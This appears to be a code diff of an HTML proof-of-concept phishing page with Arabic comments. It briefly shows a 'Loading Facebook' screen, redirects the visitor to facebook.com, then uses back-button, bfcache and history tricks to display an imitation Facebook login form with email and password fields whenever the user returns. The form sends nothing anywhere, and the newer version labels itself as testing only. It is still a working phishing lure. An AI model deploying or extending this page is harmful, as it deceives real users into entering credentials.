@@ -1,133 +1,107 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-<meta charset="UTF-8">
-<title>Meta Open Redirect PoC</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>PoC Redirect</title>
 <style>
-    body {
-        margin: 0;
-        padding: 0;
-        background: #f0f2f5;
-        font-family: Arial, sans-serif;
-    }
-    /* شاشة الـ Loading */
-    .loading {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        color: #1877f2;
-        font-size: 18px;
-        height: 100vh;
-    }
-    .dot {
-        width: 8px;
-        height: 8px;
-        background: #1877f2;
-        border-radius: 50%;
-        animation: blink 1.2s infinite ease-in-out;
-    }
-    .dot:nth-child(2) { animation-delay: 0.2s; }
-    .dot:nth-child(3) { animation-delay: 0.4s; }
-    @keyframes blink {
-        0%, 80%, 100% { opacity: 0; }
-        40% { opacity: 1; }
-    }
-    /* ديزاين صفحة الفيس */
-    .container {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-    .login-box {
-        background: white;
-        padding: 20px;
-        border-radius: 8px;
-        box-shadow: 0px 2px 8px rgba(0,0,0,0.1);
-        width: 320px;
-    }
-    .logo {
-        text-align: center;
-        font-size: 36px;
-        color: #1877f2;
-        font-weight: bold;
-        margin-bottom: 20px;
-    }
-    input {
-        width: 100%;
-        padding: 12px;
-        margin: 6px 0;
-        border: 1px solid #ddd;
-        border-radius: 6px;
-        font-size: 14px;
-    }
-    .login-btn {
-        width: 100%;
-        padding: 12px;
-        background: #1877f2;
-        color: white;
-        border: none;
-        border-radius: 6px;
-        font-size: 16px;
-        font-weight: bold;
-        cursor: pointer;
-    }
-    .create-btn {
-        width: 100%;
-        padding: 12px;
-        background: #42b72a;
-        color: white;
-        border: none;
-        border-radius: 6px;
-        font-size: 16px;
-        font-weight: bold;
-        margin-top: 10px;
-        cursor: pointer;
-    }
+  body{margin:0;font-family:Arial, sans-serif;background:#f0f2f5}
+  .loading{height:100vh;display:flex;align-items:center;justify-content:center;color:#1877f2;font-size:18px}
+  .dots{display:inline-flex;gap:8px;margin-left:10px}
+  .dot{width:8px;height:8px;border-radius:50%;background:#1877f2;animation:blink 1.2s infinite}
+  .dot:nth-child(2){animation-delay:.2s}.dot:nth-child(3){animation-delay:.4s}
+  @keyframes blink{0%,80%,100%{opacity:0}40%{opacity:1}}
+  .container{display:flex;justify-content:center;align-items:center;height:100vh}
+  .login-box{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);width:340px}
+  .logo{text-align:center;font-size:36px;color:#1877f2;font-weight:700;margin-bottom:18px}
+  input{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}
+  .login-btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-weight:700;cursor:pointer}
+  .create-btn{width:100%;padding:12px;background:#42b72a;color:#fff;border:none;border-radius:6px;margin-top:10px;cursor:pointer}
+  .note{font-size:12px;color:#666;text-align:center;margin-top:12px}
 </style>
 <script>
-function showFakeFacebook() {
+(function(){
+  const REDIRECT_URL = "https://facebook.com/a";
+  const HASH_MARK = "#poс-r"; // استخدم علامة واضحة
+
+  function showLoading() {
     document.body.innerHTML = `
-        <div class="container">
-            <div class="login-box">
-                <div class="logo">facebook</div>
-                <input type="text" placeholder="Email address or phone number">
-                <input type="password" placeholder="Password">
-                <button class="login-btn">Log in</button>
-                <button class="create-btn">Create new account</button>
-            </div>
-        </div>
+      <div class="loading">
+        Loading Facebook<span class="dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>
+      </div>
     `;
-}
+  }
 
-window.onload = function () {
-    let navType = (performance.getEntriesByType("navigation")[0] || {}).type;
+  function showFakeFacebook() {
+    // ضع هنا التصميم المزيف لصفحة التسجيل/اللوغين
+    document.body.innerHTML = `
+      <div class="container">
+        <div class="login-box">
+          <div class="logo">facebook</div>
+          <input type="text" placeholder="Email address or phone number" autocomplete="off" />
+          <input type="password" placeholder="Password" autocomplete="off" />
+          <button class="login-btn">Log in</button>
+          <button class="create-btn">Create new account</button>
+          <div class="note">This is a PoC fake page — for testing only.</div>
+        </div>
+      </div>
+    `;
+    // حذف الهَاش من الـURL للإظهار النظيف (اختياري)
+    try { history.replaceState(null, "", location.pathname + location.search); } catch(e){}
+  }
 
-    if (navType === "back_forward") {
-        // لو جاي من Back أو Forward → عرض الفيس المزيف مباشرة
-        showFakeFacebook();
-    } else if (!sessionStorage.getItem('redirected')) {
-        // أول مرة → Loading ثم Redirect
-        document.body.innerHTML = `
-            <div class="loading">
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                Loading Facebook...
-            </div>
-        `;
-        sessionStorage.setItem('redirected', 'true');
-        setTimeout(function(){
-            window.location.href = "https://facebook.com/a";
-        }, 1500);
+  // عندما يجينا حدث popstate (مثل Back)
+  window.addEventListener('popstate', function(e){
+    // اعرض الصفحة المزيفة فورًا
+    showFakeFacebook();
+  });
+
+  // pageshow يتعامل مع bfcache (الصفحات المستعادة من الذاكرة)
+  window.addEventListener('pageshow', function(e){
+    if (e.persisted) {
+      // صفحة مستعادة من bfcache -> عرض المزيف
+      showFakeFacebook();
     } else {
-        // أي مرة تانية غير الـBack → عرض الفيس المزيف
+      // أحيانًا الصفحات العائدة من Back تظهر هنا بدون persisted، فنتحقق من الهَاش
+      if (location.hash === HASH_MARK || sessionStorage.getItem('redirected') === 'true') {
         showFakeFacebook();
+      }
     }
-};
+  });
+
+  // نقطة الدخول الأساسية
+  document.addEventListener('DOMContentLoaded', function(){
+    const wasRedirected = sessionStorage.getItem('redirected') === 'true';
+    const navEntries = performance.getEntriesByType && performance.getEntriesByType('navigation') || [];
+    const navType = (navEntries[0] && navEntries[0].type) || (performance && performance.navigation && performance.navigation.type) || 'navigate';
+
+    // 1) لو أول زيارة
+    if (!wasRedirected) {
+      // نحافظ على صفحة في الـhistory + ندفع هاش كدخل إضافي
+      try {
+        history.replaceState({stage:'start'}, "", location.pathname + location.search); // حالة البداية
+        history.pushState({stage:'pre-redirect'}, "", location.pathname + location.search + HASH_MARK); // إضافة مدخل داخل نفس الدومين
+      } catch (e) {
+        // لو متصفح يقفل تغيير الـURL، نجري بدون تغيير
+      }
+
+      // عرض Loading ثم Redirect
+      showLoading();
+      sessionStorage.setItem('redirected','true');
+      setTimeout(function(){
+        location.href = REDIRECT_URL;
+      }, 1500);
+      return;
+    }
+
+    // 2) لو رجعنا (عند Load ثاني أو Refresh) → اعرض المزيف فوراً
+    // هذا يضمن أن Back أو Refresh سيظهران الصفحة المزيفة مباشرة
+    showFakeFacebook();
+  });
+})();
 </script>
 </head>
 <body>
+<!-- المحتوى يتم إدخاله عن طريق السكربت -->
 </body>
 </html>
